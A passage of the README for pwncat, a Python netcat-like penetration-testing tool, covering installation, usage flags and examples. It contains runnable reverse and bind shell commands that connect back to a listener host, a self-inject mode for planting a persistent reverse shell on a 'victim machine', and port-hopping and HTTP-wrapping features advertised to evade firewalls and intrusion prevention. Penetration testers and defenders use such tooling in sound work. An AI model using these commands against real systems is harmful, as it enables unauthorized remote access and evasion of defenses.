href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.7/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.8</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.8\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.8/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.8\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.8/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.8\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.8/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>pypy2</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py2\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-py2/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-py2\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-py2/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-py2\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-py2/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>pypy3</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py3\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-py3/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-py3\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-py3/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-py3\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-py3/badge.svg\\\" /></a></td>\\n </tr>\\n </tbody>\\n </table>\\n </td>\\n </tr>\\n </tbody>\\n</table>\\n\\n> <sup>[1] <a href=\\\"https://cytopia.github.io/pwncat/pwncat.type.html\\\">mypy type coverage</a> <strong>(fully typed: 93.84%)</strong></sup><br/>\\n> <sup>[2] <strong>Failing builds do not indicate broken functionality.</strong> Integration tests run for multiple hours and break sporadically for various different reasons (network timeouts, unknown cancellations of GitHub Actions, etc): <a href=\\\"https://github.com/actions/virtual-environments/issues/736\\\">#735</a>, <a href=\\\"https://github.com/actions/virtual-environments/issues/841\\\">#841</a></sup><br/>\\n> <sup></sup>\\n\\n\\n#### Motivation\\nEver accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?\\nEver waited forever for your client to connect back to you, because the Firewall didn't let it out?\\nEver had a connection loss because an IPS closed suspicious ports?\\nEver were in need of a quick port forwarding?<br/>\\n> **This one got you covered.**\\n\\nApart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single\\ntool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.\\n(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).\\n\\n\\n## :tada: Install\\n\\nCurrent version is: **0.1.0**\\n\\n| [Pip](https://pypi.org/project/pwncat/) | [ArchLinux](https://aur.archlinux.org/packages/pwncat/) | [BlackArch](https://www.blackarch.org/tools.html) | [MacOS](https://formulae.brew.sh/formula/pwncat#default) |\\n|:-:|:-:|:-:|:-:|\\n| [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/python.png)](https://pypi.org/project/pwncat/) | [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/archlinux.png)](https://aur.archlinux.org/packages/pwncat/) | [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/blackarch.png)](https://www.blackarch.org/tools.html) | [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/osx.png)](https://formulae.brew.sh/formula/pwncat#default) |\\n| `pip install pwncat` | `yay -S pwncat` | `pacman -S pwncat` | `brew install pwncat` |\\n\\n\\n## :coffee: TL;DR\\n\\nThis is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.\\n\\n### See in action\\n\\n<table>\\n <tr>\\n <td widht=\\\"50%\\\" style=\\\"text-align:center;\\\">\\n <a href=\\\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\\\">unbreakable reverse shells - how to spawn</a><br/><br/>\\n <a href=\\\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\\\"><img src=\\\"docs/img/video01.png\\\" /></a>\\n </td>\\n <td widht=\\\"50%\\\" style=\\\"text-align:center;\\\">\\n <a href=\\\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\">unbreakable reverse shells - multiple shells</a><br/><br/>\\n <a href=\\\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\"><img src=\\\"docs/img/video02.png\\\" /></a>\\n </td>\\n </tr>\\n</table>\\n\\n\\n### Deploy to target\\n```bash\\n# Copy base64 data to clipboard from where you have internet access\\ncurl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64\\n\\n# Paste it on the target machine\\necho \\\"<BASE64 STRING>\\\" | base64 -d > pwncat\\nchmod +x pwncat\\n```\\n\\n### Inject to target\\n```bash\\n# [1] If you found a vulnerability on the target to start a very simple reverse shell,\\n# such as via bash, php, perl, python, nc or similar, you can instruct your local\\n# pwncat listener to use this connection to deploy itself on the target automatically\\n# and start an additional unbreakable reverse shell back to you.\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445\\n```\\n> <sup>[1] [Read in more detail about self-injection](#self-injecting-reverse-shell)\\n\\n### Summon shells\\n```bash\\n# Bind shell (accepts new clients after disconnect)\\npwncat -l -e '/bin/bash' 8080 -k\\n```\\n```bash\\n# Reverse shell (Ctrl+c proof: reconnects back to you)\\npwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1\\n```\\n```bash\\n# Reverse UDP shell (Ctrl+c proof: reconnects back to you)\\npwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1\\n```\\n\\n### Port scan\\n```bash\\n# [TCP] IPv4 + IPv6\\npwncat -z 10.0.0.1 80,443,8080\\npwncat -z 10.0.0.1 1-65535\\npwncat -z 10.0.0.1 1+1023\\n\\n# [UDP] IPv4 + IPv6\\npwncat -z 10.0.0.1 80,443,8080 -u\\npwncat -z 10.0.0.1 1-65535 -u\\npwncat -z 10.0.0.1 1+1023 -u\\n\\n# Use only IPv6 or IPv4\\npwncat -z 10.0.0.1 1-65535 -4\\npwncat -z 10.0.0.1 1-65535 -6 -u\\n\\n# Add version detection\\npwncat -z 10.0.0.1 1-65535 --banner\\n```\\n\\n### Local port forward `-L` (listening proxy)\\n```bash\\n# Make remote MySQL server (remote port 3306) available on current machine\\n# on every interface on port 5000\\npwncat -L 0.0.0.0:5000 everythingcli.org 3306\\n```\\n```bash\\n# Same, but convert traffic on your end to UDP\\npwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u\\n```\\n\\n### Remote port forward `-R` (double client proxy)\\n```bash\\n# Connect to Remote MySQL server (remote port 3306) and then connect to another\\n# pwncat/netcat server on 10.0.0.1:4444 and bridge traffic\\npwncat -R 10.0.0.1:4444 everythingcli.org 3306\\n```\\n```bash\\n# Same, but convert traffic on your end to UDP\\npwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u\\n```\\n\\n> <sub>[SSH Tunnelling for fun and profit :link:](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/)</sub><br/>\\n> <sub>[`pwncat` example: Port forwarding magic](#port-forwarding-magic)<sub>\\n\\n\\n## :star: Features\\n\\n### At a glance\\n\\n`pwncat` has many features, below is only a list of outstanding characteristics.\\n\\n| Feature | Description |\\n|----------------|-------------|\\n| [PSE](pse) | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |\\n| port scanning | TCP und UDP port scanning with basic version detection support |\\n| Self-injecting rshell | Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically |\\n| Bind shell | Create bind shells |\\n| Reverse shell | Create reverse shells |\\n| Port Forward | Local and remote port forward (Proxy server/client) |\\n| <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |\\n| Detect Egress | Scan and report open egress ports on the target (port hopping) |\\n| Evade FW | Evade egress firewalls by round-robin outgoing ports (port hopping) |\\n| Evade IPS | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping) |\\n| UDP rev shell | Try this with the traditional `netcat` |\\n| Stateful UDP | Stateful connect phase for UDP client mode |\\n| TCP / UDP | Full TCP and UDP support |\\n| IPv4 / IPv6 | Dual or single stack IPv4 and IPv6 support |\\n| Python 2+3 | Works with Python 2, Python 3, pypy2 and pypy3 |\\n| Cross OS | Work on Linux, MacOS and Windows as long as Python is available |\\n| Compatability | Use the `netcat`, `ncat` or `socat` as a client or server together with `pwncat` |\\n| Portable | Single file which only uses core packages - no external dependencies required. |\\n\\n\\n### Feature comparison matrix\\n\\n| | pwncat | netcat | ncat | socat |\\n|---------------------|----------|--------|-------|-------|\\n| Scripting engine | \\u2714 Python | :x: | \\u2714 Lua | :x: |\\n| | | | | |\\n| IP ToS | \\u2714 | \\u2714 | :x: | \\u2714 |\\n| IPv4 | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| IPv6 | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Unix domain sockets | :x: | \\u2714 | \\u2714 | \\u2714 |\\n| Linux vsock | :x: | :x: | \\u2714 | :x: |\\n| Socket source bind | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| | | | | |\\n| TCP | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| UDP | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| SCTP | :x: | :x: | \\u2714 | \\u2714 |\\n| SSL | :x: | :x: | \\u2714 | \\u2714 |\\n| HTTP | \\u2714 | :x: | :x: | :x: |\\n| HTTPS | * | :x: | :x: | :x: |\\n| | | | | |\\n| Telnet negotiation | :x: | \\u2714 | \\u2714 | :x: |\\n| Proxy support | :x: | \\u2714 | \\u2714 | \\u2714 |\\n| Local port forward | \\u2714 | :x: | :x: | \\u2714 |\\n| Remote port forward | \\u2714 | :x: | :x: | :x: |\\n| | | | | |\\n| Inbound port scan | \\u2714 | \\u2714 | \\u2714 | :x: |\\n| Outbound port scan | \\u2714 | :x: | :x: | :x: |\\n| Version detection | \\u2714 | :x: | :x: | :x: |\\n| | | | | |\\n| Chat | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Command execution | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Hex dump | * | \\u2714 | \\u2714 | \\u2714 |\\n| Broker | :x: | :x: | \\u2714 | :x: |\\n| Simultaneous conns | :x: | :x: | \\u2714 | \\u2714 |\\n| Allow/deny | :x: | :x: | \\u2714 | \\u2714 |\\n| Re-accept | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Self-injecting | \\u2714 | :x: | :x: | :x: |\\n| UDP reverse shell | \\u2714 | :x: | :x: | :x: |\\n| Respawning client | \\u2714 | :x: | :x: | :x: |\\n| Port hopping | \\u2714 | :x: | :x: | :x: |\\n| Emergency shutdown | \\u2714 | :x: | :x: | :x: |\\n\\n> <sup>`*` Feature is currently under development.\\n\\n\\n## :cop: Behaviour\\n\\nLike the original implementation of `netcat`, when using **TCP**, `pwncat`\\n(in client and listen mode) will automatically quit, if the network connection has been terminated,\\nproperly or improperly.\\nIn case the remote peer does not terminate the connection, or in **UDP** mode, `netcat` and `pwncat` will stay open. The behaviour differs a bit when STDIN is closed.\\n\\n1. `netcat`: If STDIN is closed, but connection stays open, `netcat` will stay open\\n2. `pwncat`: If STDIN is closed, but connection stays open, `pwncat` will close\\n\\nYou can emulate the `netcat` behaviour with `--no-shutdown` command line argument.\\n\\nHave a look at the following commands to better understand this behaviour:\\n\\n```bash\\n# [Valid HTTP request] Quits, web server keeps connection intact, but STDIN is EOF\\nprintf \\\"GET / HTTP/1.1\\\\n\\\\n\\\" | pwncat www.google.com 80\\n\\n# [Valid HTTP request] Does not quit, web server keeps connection intact, but STDIN is EOF\\nprintf \\\"GET / HTTP/1.1\\\\n\\\\n\\\" | pwncat www.google.com 80 --no-shutdown\\n```\\n\\n```bash\\n# [Invalid HTTP request] Quits, because the web server closes the connection and STDIN is EOF\\nprintf \\\"GET / \\\\n\\\\n\\\" | pwncat www.google.com 80\\n```\\n\\n```bash\\n# [TCP]\\n# Both instances will quit after successful file transfer.\\npwncat -l 4444 > output.txt\\npwncat localhost 4444 < input.txt\\n\\n# [TCP]\\n# Neither of both, client and server will quit after successful transfer\\n# and they will be stuck, waiting for more input or output.\\n# When exiting one (e.g.: via Ctrl+c), the other one will quit as well.\\npwncat -l 4444 --no-shutdown > output.txt\\npwncat localhost 4444 --no-shutdown < input.txt\\n```\\n\\nBe advised that it is not reliable to send files via UDP\\n```bash\\n# [UDP] (--no-shutdown has no effect, as this is the default behaviour in UDP)\\n# Neither of both, client and server will quit after successful transfer\\n# and they will be stuck, waiting for more input or output.\\n# When exiting one (e.g.: via Ctrl+c), the other one will still stay open in UDP mode.\\npwncat -u -l 4444 > output.txt\\npwncat -u localhost 4444 < input.txt\\n```\\n\\nThere are many ways to alter this default behaviour. Have a look at the [usage](#computer-usage)\\nsection for more advanced settings.\\n\\n\\n## :closed_book: Documentation\\n\\nDocumentation will evolve over time.\\n\\n* API docs can be found here: [pwncat.api.html](https://cytopia.github.io/pwncat/pwncat.api.html)\\n* Python type coverage can be found here: [pwncat.type.html](https://cytopia.github.io/pwncat/pwncat.type.html)\\n* HTML man page can be found here: [pwncat.man.html](https://cytopia.github.io/pwncat/pwncat.man.html)\\n* Raw man page can be found here: [pwncat.1](man/pwncat.1)\\n\\n\\n## :computer: Usage\\n\\n### Keys\\n\\n| Behaviour | ![Alt][Linux] | ![Alt][MacOS] | ![Alt][Windows] |\\n|----------------|---------------|---------------|-----------------|\\n| Quit (SIGINT) | <kbd>Ctrl</kbd>+<kbd>c</kbd> | <kbd>Ctrl</kbd>+<kbd>c</kbd> | <kbd>Ctrl</kbd>+<kbd>c</kbd> |\\n| Quit (SIGQUIT) | <kbd>Ctrl</kbd>+<kbd>\\\\\\\\</kbd> | ? | ? |\\n| Quit (SIGQUIT) | <kbd>Ctrl</kbd>+<kbd>4</kbd> | ? | ? |\\n| Quit STDIN<sup>[1]</sup> | <kbd>Ctrl</kbd>+<kbd>d</kbd> | <kbd>Ctrl</kbd>+<kbd>d</kbd> | <kbd>Ctrl</kbd>+<kbd>z</kbd> and <kbd>Ctrl</kbd>+<kbd>Enter</kbd> |\\n| Send (NL) | <kbd>Ctrl</kbd>+<kbd>j</kbd> | ? | ? |\\n| Send (EOL) | <kbd>Ctrl</kbd>+<kbd>m</kbd> | ? | ? |\\n| Send (EOL) | <kbd>Enter</kbd> | <kbd>Enter</kbd> | <kbd>Enter</kbd> |\\n\\n> <sup>[1] Only works when not using `--no-shutdown` and `--keep`. Will then shutdown it's socket for sending, signaling the remote end and EOF on its socket.</sup>\\n\\n[Linux]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/linux.png \\\"Linux\\\"\\n[MacOS]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/osx.png \\\"MacOS\\\"\\n[Windows]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/windows.png \\\"Windows\\\"\\n\\n### Command line arguments\\n\\nType `pwncat -h` or click below to see all available options.\\n\\n<details>\\n <summary><strong>Click here to expand usage</strong></summary>\\n\\n```\\nusage: pwncat [options] hostname port\\n pwncat [options] -l [hostname] port\\n pwncat [options] -z hostname port\\n pwncat [options] -L [addr:]port hostname port\\n pwncat [options] -R addr:port hostname port\\n pwncat -V, --version\\n pwncat -h, --help\\n\\n\\nEnhanced and comptaible Netcat implementation written in Python (2 and 3) with\\nconnect, zero-i/o, listen and forward modes and techniques to detect and evade\\nfirewalls and intrusion detection/prevention systems.\\n\\nIf no mode arguments are specified, pwncat will run in connect mode and act as\\na client to connect to a remote endpoint. If the connection to the remote\\nendoint is lost, pwncat will quit. See options for how to automatically re-\\nconnect.\\n\\npositional arguments:\\n hostname Address to listen, forward, scan or connect to.\\n\\n port [All modes]\\n Single port to listen, forward or connect to.\\n [Zero-I/O mode]\\n Specify multiple ports to scan:\\n Via list: 4444,4445,4446\\n Via range: 4444-4446\\n Via incr: 4444+2\\n\\nmode arguments:\\n -l, --listen [Listen mode]:\\n Start a server and listen for incoming connections.\\n If using TCP and a connected client disconnects or the\\n connection is interrupted otherwise, the server will\\n quit. See -k/--keep-open to change this behaviour.\\n\\n -z, --zero [Zero-I/0 mode]:\\n Connect to a remote endpoint and report status only.\\n Used for port scanning.\\n See --banner for version detection.\\n\\n -L [addr:]port, --local [addr:]port\\n [Local forward mode]:\\n This mode will start a server and a client internally.\\n The internal server will listen locally on specified\\n addr/port (given by --local [addr:]port).\\n The server will then forward traffic to the internal\\n client which connects to another server specified by\\n hostname/port given via positional arguments.\\n (I.e.: proxies a remote service to a local address)\\n\\n -R addr:port, --remote addr:port\\n [Remote forward mode]:\\n This mode will start two clients internally. One is\\n connecting to the target and one is connecting to\\n another pwncat/netcat server you have started some-\\n where. Once connected, it will then proxy traffic\\n between you and the target.\\n This mode should be applied on machines that block\\n incoming traffic and only allow outbound.\\n The connection to your listening server is given by\\n -R/--remote addr:port and the connection to the\\n target machine via the positional arguments.\\n\\noptional arguments:\\n -e cmd, --exec cmd Execute shell command. Only for connect or listen mode.\\n\\n -C lf, --crlf lf Specify, 'lf', 'crlf' or 'cr' to always force replacing\\n line endings for input and outout accordingly. Specify\\n 'no' to completely remove any line feeds. By default\\n it will not replace anything and takes what is entered\\n (usually CRLF on Windows, LF on Linux and some times\\n CR on MacOS).\\n\\n -n, --nodns Do not resolve DNS.\\n\\n --send-on-eof Buffer data received on stdin until EOF and send\\n everything in one chunk.\\n\\n --no-shutdown Do not shutdown into half-duplex mode.\\n If this option is passed, pwncat won't invoke shutdown\\n on a socket after seeing EOF on stdin. This is provided\\n for backward-compatibility with OpenBSD netcat, which\\n exhibits this behavior.\\n\\n -v, --verbose Be verbose and print info to stderr. Use -v, -vv, -vvv\\n or -vvvv for more verbosity. The server performance will\\n decrease drastically if you use more than three times.\\n\\n --info type Show additional info about sockets, IPv4/6 or TCP opts\\n applied to the current socket connection. Valid\\n parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.\\n Note, you must at least be in INFO verbose mode in order\\n to see them (-vv).\\n\\n -c str, --color str Colored log output. Specify 'always', 'never' or 'auto'.\\n In 'auto' mode, color is displayed as long as the output\\n goes to a terminal. If it is piped into a file, color\\n will automatically be disabled. This mode also disables\\n color on Windows by default. (default: auto)\\n\\n --safe-word str All modes:\\n If pwncat is started with this argument, it will shut\\n down as soon as it receives the specified string. The\\n --keep-open (server) or --reconn (client) options will\\n be ignored and it won't listen again or reconnect to you.\\n Use a very unique string to not have it shut down\\n accidentally by other input.\\n\\nprotocol arguments:\\n -4 Only Use IPv4 (default: IPv4 and IPv6 dualstack).\\n\\n -6 Only Use IPv6 (default: IPv4 and IPv6 dualstack).\\n\\n -u, --udp Use UDP for the connection instead of TCP.\\n\\n -T str, --tos str Specifies IP Type of Service (ToS) for the connection.\\n Valid values are the tokens 'mincost', 'lowcost',\\n 'reliability', 'throughput' or 'lowdelay'.\\n\\n --http Connect / Listen mode (TCP and UDP):\\n Hide traffic in http packets to fool Firewalls/IDS/IPS.\\n\\n --https Connect / Listen mode (TCP and UDP):\\n Hide traffic in https packets to fool Firewalls/IDS/IPS.\\n\\n -H [str [str ...]], --header [str [str ...]]\\n Add HTTP headers to your request when using --http(s).\\n\\ncommand & control arguments:\\n --self-inject cmd:host:port[s]\\n Listen mode (TCP only):\\n If you are about to inject a reverse shell onto the\\n victim machine (via php, bash, nc, ncat or similar),\\n start your listening server with this argument.\\n This will then (as soon as the reverse shell connects)\\n automatically deploy and background-run an unbreakable\\n pwncat reverse shell onto the victim machine which then\\n also connects back to you with specified arguments.\\n Example: '--self-inject /bin/bash:10.0.0.1:4444'\\n It is also possible to launch multiple reverse shells by\\n specifying multiple ports.\\n Via list: --self-inject /bin/sh:10.0.0.1:4444,4445,4446\\n Via range: --self-inject /bin/sh:10.0.0.1:4444-4446\\n Via incr: --self-inject /bin/sh:10.0.0.1:4444+2\\n Note: this is currently an experimental feature and does\\n not work on Windows remote hosts yet.\\n\\npwncat scripting engine:\\n --script-send file All modes (TCP and UDP):\\n A Python scripting engine to define your own custom\\n transformer function which will be executed before\\n sending data to a remote endpoint. Your file must\\n contain the exact following function which will:\\n be applied as the transformer:\\n def transform(data, pse):\\n # NOTE: the function name must be 'transform'\\n # NOTE: the function param name must be 'data'\\n # NOTE: indentation must be 4 spaces\\n # ... your transformations goes here\\n return data\\n You can also define as many custom functions or classes\\n within this file, but ensure to prefix them uniquely to\\n not collide with pwncat's function or classes, as the\\n file will be called with exec().\\n\\n --script-recv file All modes (TCP and UDP):\\n A Python scripting engine to define your own custom\\n transformer function which will be executed after\\n receiving data from a remote endpoint. Your file must\\n contain the exact following function which will:\\n be applied as the transformer:\\n def transform(data, pse):\\n # NOTE: the function name must be 'transform'\\n # NOTE: the function param name must be 'data'\\n # NOTE: indentation must be 4 spaces\\n # ... your transformations goes here\\n return data\\n You can also define as many custom functions or classes\\n within this file, but ensure to prefix them uniquely to\\n not collide with pwncat's function or classes, as the\\n file will be called with exec().\\n\\nzero-i/o mode arguments:\\n --banner Zero-I/O (TCP and UDP):\\n Try banner grabbing during port scan.\\n\\nlisten mode arguments:\\n -k, --keep-open Listen mode (TCP only):\\n Re-accept new clients in listen mode after a client has\\n disconnected or the connection is unterrupted otherwise.\\n (default: server will quit after connection is gone)\\n\\n --rebind [x] Listen mode (TCP and UDP):\\n If the server is unable to bind, it will re-initialize\\n itself x many times before giving up. Omit the\\n quantifier to rebind endlessly or specify a positive\\n integer for how many times to rebind before giving up.\\n See --rebind-robin for an interesting use-case.\\n (default: fail after first unsuccessful try).\\n\\n --rebind-wait s Listen mode (TCP and UDP):\\n Wait x seconds between re-initialization. (default: 1)\\n\\n --rebind-robin port Listen mode (TCP and UDP):\\n If the server is unable to initialize (e.g: cannot bind\\n and --rebind is specified, it it will shuffle ports in\\n round-robin mode to bind to.\\n Use comma separated string such as '80,81,82,83', a range\\n of ports '80-83' or an increment '80+3'.\\n Set --rebind to at least the number of ports to probe +1\\n This option requires --rebind to be specified.\\n\\nconnect mode arguments:\\n --source-addr addr Specify source bind IP address for connect mode.\\n\\n --source-port port Specify source bind port for connect mode.\\n\\n --reconn [x] Connect mode (TCP and UDP):\\n If the remote server is not reachable or the connection\\n is interrupted, the client will connect again x many\\n times before giving up. Omit the quantifier to retry\\n endlessly or specify a positive integer for how many\\n times to retry before giving up.\\n (default: quit if the remote is not available or the\\n connection was interrupted)\\n This might be handy for stable TCP reverse shells ;-)\\n Note on UDP:\\n By default UDP does not know if it is connected, so\\n it will stop at the first port and assume it has a\\n connection. Consider using --udp-sconnect with this\\n option to make UDP aware of a successful connection.\\n\\n --reconn-wait s Connect mode (TCP and UDP):\\n Wait x seconds between re-connects. (default: 1)\\n\\n --reconn-robin port Connect mode (TCP and UDP):\\n If the remote server is not reachable or the connection\\n is interrupted and --reconn is specified, the client\\n will shuffle ports in round-robin mode to connect to.\\n Use comma separated string such as '80,81,82,83', a range\\n of ports '80-83' or an increment '80+3'.\\n Set --reconn to at least the number of ports to probe +1\\n This helps reverse shell to evade intrusiona prevention\\n systems that will cut your connection and block the\\n outbound port.\\n This is also useful in Connect or Zero-I/O mode to\\n figure out what outbound ports are allowed.\\n\\n --ping-init Connect mode (TCP and UDP):\\n UDP is a stateless protocol unlike TCP, so no hand-\\n shake communication takes place and the client just\\n sends data to a server without being \\\"accepted\\\" by\\n the server first.\\n This means a server waiting for an UDP client to\\n connect to, is unable to send any data to the client,\\n before the client hasn't send data first. The server\\n simply doesn't know the IP address before an initial\\n connect.\\n The --ping-init option instructs the client to send one\\n single initial ping packet to the server, so that it is\\n able to talk to the client.\\n This is a way to make a UDP reverse shell work.\\n See --ping-word for what char/string to send as initial\\n ping packet (default: '\\\\0')\\n\\n --ping-intvl s Connect mode (TCP and UDP):\\n Instruct the client to send ping intervalls every s sec.\\n This allows you to restart your UDP server and just wait\\n for the client to report back in. This might be handy\\n for stable UDP reverse shells ;-)\\n See --ping-word for what char/string to send as initial\\n ping packet (default: '\\\\0')\\n\\n --ping-word str Connect mode (TCP and UDP):\\n Change the default character '\\\\0' to use for upd ping.\\n Single character or strings are supported.\\n\\n --ping-robin port Connect mode (TCP and UDP):\\n Instruct the client to shuffle the specified ports in\\n round-robin mode for a remote server to ping.\\n This might be handy to scan outbound allowed ports.\\n Use comma separated string such as '80,81,82,83', a range\\n of ports '80-83' or an increment '80+3'.\\n Use --ping-intvl 0 to be faster.\\n\\n --udp-sconnect Connect mode (UDP only):\\n Emulating stateful behaviour for UDP connect phase by\\n sending an initial packet to the server to validate if\\n it is actually connected.\\n By default, UDP will simply issue a connect and is not\\n aware if it is really connected or not.\\n The default connect packet to be send is '\\\\0', you\\n can change this with --udp-sconnect-word.\\n\\n --udp-sconnect-word [str]\\n Connect mode (UDP only):\\n Change the the data to be send for UDP stateful connect\\n behaviour. Note you can also omit the string to send an\\n empty packet (EOF), but be aware that some servers such\\n as netcat will instantly quit upon receive of an EOF\\n packet.\\n The default is to send a null byte sting: '\\\\0'.\\n\\nmisc arguments:\\n -h, --help Show this help message and exit\\n -V, --version Show version information and exit\\n```\\n</details>\\n\\n\\n## :bulb: Examples\\n\\n### Upgrade your shell to interactive\\n<!--\\n<details>\\n <summary>Click to expand</summary>\\n-->\\n\\n> This is a universal advice and not only works with `pwncat`, but with all other common tools.\\n\\nWhen connected with a reverse or bind shell you'll notice that no interactive commands will work and\\nhitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.\\nTo fix this, you'll need to attach it to a TTY (make it interactive). Here's how:\\n```bash\\npython3 -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\n```\\n<kbd>Ctrl</kbd>+<kbd>z</kbd>\\n```bash\\n# get your current terminal size (rows and columns)\\nstty size\\n\\n# for bash/sh (enter raw mode and disable echo'ing)\\nstty raw -echo\\nfg\\n\\n# for zsh (enter raw mode and disable echo'ing)\\nstty raw -echo; fg\\n\\nreset\\nexport SHELL=bash\\nexport TERM=xterm\\nstty rows <num> columns <cols> # <num> and <cols> values found above by 'stty size'\\n```\\n> <sup>[1] [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)</sup>\\n\\n\\n### UDP reverse shell\\nWithout tricks a UDP reverse shell is not really possible. UDP is a stateless protocol compared to TCP and does not have a `connect()` method as TCP does.\\nIn TCP mode, the server will know the client IP and port, once the client issues a `connects()`.\\nIn UDP mode, as there is no `connect()`, the client simply sends data to an address/port without having to connect first.\\nTherefore, in UDP mode, the server will not be able to know the IP and port of the client and hence, cannot send data to it first.\\nThe only way to make this possible is to have the client send some sort of data to the server first, so that the server can see what IP/port has sent data to it.\\n\\n`pwncat` emulates the TCP `connect()` by having the client send a null byte to the server once or periodically via `--ping-intvl` or `--ping-init`.\\n\\n```bash\\n# The client\\n# --exec # Provide this executable\\n# --udp # Use UDP mode\\n# --ping-init # Send an initial null byte to the server\\npwncat --exec /bin/bash --udp --ping-init 10.0.0.1 4444\\n```\\n\\n\\n### Unbreakable TCP reverse shell\\nWhy unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.\\nIn other words, the client will keep trying to connect to the specified server until success. If the connection is interrupted, it will keep trying again.\\n```bash\\n# The client\\n# --exec # Provide this executable\\n# --nodns # Keep the noise down and don't resolve hostnames\\n# -reconn # Automatically reconnect back to you indefinitely\\n# --reconn-wait # If connection is lost, connect back to you every 2 seconds\\n\\npwncat --exec /bin/bash --nodns --reconn --reconn-wait 2 10.0.0.1 4444\\n```\\n\\n### Unbreakable UDP reverse shell\\nWhy unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.\\nIn other words, the client will keep sending null bytes to the server to constantly announce itself.\\n```bash\\n# The client\\n# --exec # Provide this executable\\n# --nodns # Keep the noise down and don't resolve hostnames\\n# --udp # Use UDP mode\\n# --ping-intvl # Ping the server every 2 seconds\\n\\npwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444\\n```\\n\\n### Self-injecting reverse shell\\n\\nLet's imagine you are able to create a very simple and unstable reverse shell from the target to\\nyour machine, such as a web shell via a PHP script or similar.\\nKnowing, that this will not persist very long or might break due to unstable network connection,\\nyou could use `pwncat` to hook into this connection and 